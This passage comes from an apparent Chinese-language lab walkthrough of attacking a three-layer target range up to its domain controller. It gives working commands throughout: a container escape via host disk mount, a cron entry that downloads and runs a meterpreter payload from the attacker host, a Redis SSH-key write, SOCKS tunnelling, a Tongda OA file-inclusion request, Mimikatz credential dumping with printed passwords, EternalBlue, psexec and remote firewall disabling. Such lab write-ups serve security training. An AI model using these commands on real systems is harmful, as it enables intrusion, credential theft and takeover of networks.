    mkdir /hack
然后 `ls /dev` 看到/dev目录会发现很多设备文件，
我们可以尝试将 /dev/sda1 挂载到/hack目录里：
    mount /dev/sda1 /hack
如上图所示挂载成功了，此时我们就可以通过访问容器内部的/hack路径来达到访问整个宿主机的目的
> **在docker容器里挂载一个宿主的本地目录，这样某些容器里输出的文件，就可以在本地目录中打开访问了。**
我们可以通过写入计划任务的方式在宿主机执行metasploit生成的命令。
首先使用metasploit的web_delivery模块生成payload命令：
    use exploit/multi/script/web_delivery
    set target 6    # 选择目标系统
    set payload linux/x64/meterpreter/reverse_tcp
    set lhost 192.168.1.7
    set lport 4444
    exploit
如上图，只要将生成的命令再目标主机上执行，便可以得到目标主机的meterpreter。我们将该命令写入宿主机的计划任务中：
    echo '* * * * * wget -qO KdwGEmVm --no-check-certificate http://192.168.1.7:8080/kvMOwncGb; chmod +x KdwGEmVm; ./KdwGEmVm& disown' >> /hack/var/spool/cron/root
如下图，宿主机上线meterpreter：  
信息收集可得其系统版本为Ubuntu 14.04。
可怪事来了，我们查看了目标宿主机的网络配置后，仅发现了两个内网的网段“192.168.52.1/24”和“192.168.93.1/24”：  
那我们访问的192.168.1.8去哪了？
难道目标网站做了反向代理？先别慌，6379端口不是还有一个redis吗，试试存不存在未授权访问吧。
直接在攻击机上连接192.168.1.8:6379上的redis，竟然成功了，毕竟是靶机，就是简单：  
有了redis未授权，那么利用就简单了，我们直接往目标主机上写入SSH公钥。
先在攻击机上生成ssh公钥：
    ssh-keygen -t rsa
然后将公钥导入key.txt文件(前后用\n换行，避免和Redis里其他缓存数据混合)，再把key.txt文件内容写入目标主机的redis缓冲里：
    (echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > key.txt
    cat key.txt | redis-cli -h 192.168.1.8 -x set xxx
    // -x 代表从标准输入读取数据作为该命令的最后一个参数。
然后使用攻击机连接目标机器Redis，分别执行如下命令将ssh公钥写入目标主机：
    config set dir /root/.ssh    # 设置redis的备份路径为/root/.ssh/
    config set dbfilename authorized_keys    # 设置保存文件名为authorized_keys
    save    # 将数据保存在目标服务器硬盘上
写入成功后直接尝试连接：
    ssh 192.168.1.8
成功连接目标主机。此时查看目标机网络信息，却发现目标主机的网络连接信息全变了，并且发现了我们刚开始访问的“192.168.1.8”，还有另一个内网IP段“192.168.52.1/24”：  
系统发行版本也变为了Ubuntu 18.04.5：  
看来目标网站应该是做了反向代理了，也就是说此时拿下的Ubuntu 18主机仅仅提供一个代理服务，真正的Web服务器是之前我们拿下的那台宿主机Ubuntu
14主机。为了证实我们的猜想，我查看了Ubuntu 18上的nginx配置文件：  
如上图我们发现了nginx反向代理的标志——“proxy_pass”，可知Ubuntu 18服务器上的nginx把80端口上收到的请求转发给了
14。
好了，到目前为止我们已经拿下了两台主机：
  * DMZ区域的Ubuntu 18：192.168.1.8
  * 第二层网络的Ubuntu 14：192.168.52.20
此时，绘制出网络拓扑图如下：  
## 内网渗透
### 第二层网络渗透
在DMZ区域Ubuntu 18的meterpreter中添加一个通往192.168.52.1/24网段的路由：  
路由转发只能将msfconsole带进内网，而要想将攻击机上的其他攻击程序也带进内网还需要搭建socks代理。我们使用earthworm搭建socks5反向代理服务。
在攻击机上执行如下：
    ./ew_for_linux64 -s rcsocks -l 1080 -e 1234
在DMZ区域的Ubuntu 18上传ew_for_linux64，并执行如下命令：
    ./ew_for_linux64 -s rssocks -d 192.168.1.7 -e 1234
然后配置proxychains，将socks5服务器指向127.0.0.1:1080，之后便可以使用proxychains将我们攻击机上的程序代理进第二层网络（192.168.52.1/24）了。
接着，我们使用metasploit的 auxiliary/scanner/discovery/udp_probe 模块来扫描第二层网络中的主机存活：
    use auxiliary/scanner/discovery/udp_probe
    set rhosts 192.168.52.1-255
    set threads 5
    run
如上图，发现第二层网络中还有一个主机（192.168.52.30），使用nmap进一步扫描该主机的信息：
    proxychains4 nmap -Pn -sT -sV -F -O 192.168.52.30
是一台Windows主机，并且该Windows主机的8080端口上有一个nginx的http服务，在攻击机的浏览器上设置好代理后，成功访问：  
是个通达OA，经测试其版本为通达OA
V11.3，该版本存在任意用户登录、文件包含和文件上传等多个漏洞。具体漏洞详情可参考：
下面我们来利用这些漏洞执行命令。首先上传图片马：  
如上图上传成功，2102是文件夹名，1811843809|shell.jpg是文件名，要把 | 修改成点。然后利用文件包含漏洞，发送如下请求：
    POST /ispirit/interface/gateway.php HTTP/1.1
    Host: 192.168.52.30:8080
    Connection: keep-alive
    Accept-Encoding: gzip, deflate
    Accept: */*
    User-Agent: python-requests/2.21.0
    Content-Length: 69
    Content-Type: application/x-www-form-urlencoded
    json={"url":"/general/../../attach/im/2102/1811843809.shell.jpg"}&cmd=whoami
如上图所示，成功执行命令。
之后就是常规操作了，使用metasploit的web_delivery模块生成powershell类型的payload，直接在目标机上执行即可拿下该Windows服务器：  
此时，绘制出网络拓扑图如下：
### 内网信息收集
拿下第二层网络中的Windows 7服务器后，接下来我们对目标内网环境进行信息收集，对目标网络有一个初步的了解：
    ipconfig /all   # 查看本机ip，所在域
    systeminfo      # 列出系统信息
    route print     # 打印路由信息
    net view        # 查看局域网内其他主机名
    arp -a          # 查看arp缓存
    whoami
    net start       # 查看开启了哪些服务
    net share       # 查看开启了哪些共享
    net config workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域
    net user                 # 查看本机用户列表
    net user /domain         # 查看域用户
    net localgroup administrators   # 查看本地管理员组（通常会有域用户）
    net view /domain         # 查看有几个域
    net user 用户名 /domain   # 获取指定域用户的信息
    net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）
    net group 组名 /domain    # 查看域中某工作组
    net group "domain admins" /domain  # 查看域管理员的名字
    net group "domain computers" /domain  # 查看域中的其他主机名
    net group "domain controllers" /domain  # 查看域控制器（可能有多台）
综合上面收集的信息，我们可知，目标网络环境存在一个名为whoamianony.org的域环境，域控制器主机名为DC.whoamianony.org，IP为192.168.93.30，域管理员为Administrator。
### 抓取域用户密码
接着，我们使用meterpreter上的kiwi模块尝试抓取域用户及域管理员的密码：
    load kiwi
    kiwi_cmd privilege::debug
    kiwi_cmd sekurlsa::logonPasswords
成功抓取到域用户bunny和域管理员administrator的凭证：
  * bunny：Bunny2021
  * administrator：Whoami2021  
### 第三层网络渗透  
现在第二层网络已经渗透完了，我们继续入侵第三层网络（192.168.93.1/24）。
在第二层网络Windows服务器的meterpreter中添加一个通往192.168.93.1/24网段的路由：
路由转发只能将msfconsole带进内网，而要想将攻击机上的其他攻击程序也带进内网还需要搭建socks代理。我们使用earthworm搭建一个二级socks5代理服务。
首先攻击机上执行如下命令添加一个转接隧道，监听1090端口，并将1090端口收到的代理请求发送给1235端口，执行命令：
    ./ew_for_linux64 -s lcx_listen -l 1090 -e 1235
然后在第二层网络的Windows服务器上传ew_for_Win.exe，并利用ssocksd方式启动999端口的正向socks代理，执行命令：
    ew_for_Win.exe -s ssocksd -l 999
最后，在DMZ区域的Ubuntu 18上传ew_for_linux64并利用lcx_slave方式，将攻击机的1235端口与第二层网络Windows
7的999端口连接起来，执行命令：
    ./ew_for_linux64 -s lcx_slave -d 192.168.1.7 -e 1235 -f 192.168.52.30 -g 999
然后配置proxychains：  
此时，就可以设置proxychains等代理工具，通过访问攻击机的1090端口来使用架设在第二层网络Windows主机上的socks代理服务，来进入第三层网络了。
在第二层网络Windows主机上执行ping命令扫描第三层网络中
接着，我们使用metasploit的 auxiliary/scanner/smb/smb_version
模块（可用来探测Windows主机存活）来扫描第三层网络中的主机存活：
    use auxiliary/scanner/smb/smb_version
    set rhosts 192.168.93.1-255
    set threads 5
    run
如上图，发现第三层网络中还有两个Windows主机，分别为DC（192.168.93.30）和PC2（192.168.93.40），使用nmap进一步扫描PC2主机信息：
    proxychains4 nmap -Pn -sT -sV 192.168.52.40
没发现什么有用的服务，我们直接打一个“永恒之蓝”试试：
    setg Proxies socks5:127.0.0.1:1090
    use exploit/windows/smb/ms17_010_eternalblue
    set rhosts 192.168.93.40
    set payload windows/x64/meterpreter/bind_tcp
    set rhost 192.168.93.40
    set lport 4444
    exploit
好家伙！真不容易。这次竟然成功了：  
第四台靶机拿下：  
此时，绘制出网络拓扑图如下：  
## 进攻域控
现在就剩下域控制器DC了。既然都抓取到域管理员的密码了，那我们直接psexec登陆就得了：
    use exploit/windows/smb/psexec
    set rhosts 192.168.93.30
    set SMBUser administrator
    set SMBPass Whoami2021
    set payload windows/meterpreter/bind_tcp
    set rhost 192.168.93.30
    run
失败了，应该是开了防火墙的原因。  
没关系，我们已经有了域控的密码了，就可以控制第二层网络的Windows 7远程关闭域控的防火墙了。首先控制第二层网络的Windows
7与域控建立ipc连接：
    net use \\192.168.93.30\ipc$ "Whoami2021" /user:"Administrator"
然后执行如下命令，使用sc远程在域制器（192.168.93.30）上创建服务关闭防火墙：
    sc \\192.168.93.30 create unablefirewall binpath= "netsh advfirewall set allprofiles state off"
    sc \\192.168.93.30 start unablefirewall
再次尝试执行 exploit/windows/smb/psexec 模块即可成功登录：  
成功拿下域控：  
到现在为止，三层网络结构中的五台主机已经全部拿下了：  
途中session断了好几次，差点气的吐血。
## 权限维持
太晚了，持久化就先不写了。。。
## Ending......
2021年2月26日 04:29
魔怔了，直接玩上瘾了，一夜没睡。
夜已深，靶场打完了，从最初的信息收集、外网初探、攻入内网、搭建代理，横向移动，到最终拿下了域控。但整个靶场所涉及的漏洞点我并没有全部测试，为什么呢？因为我要睡觉。。。。。。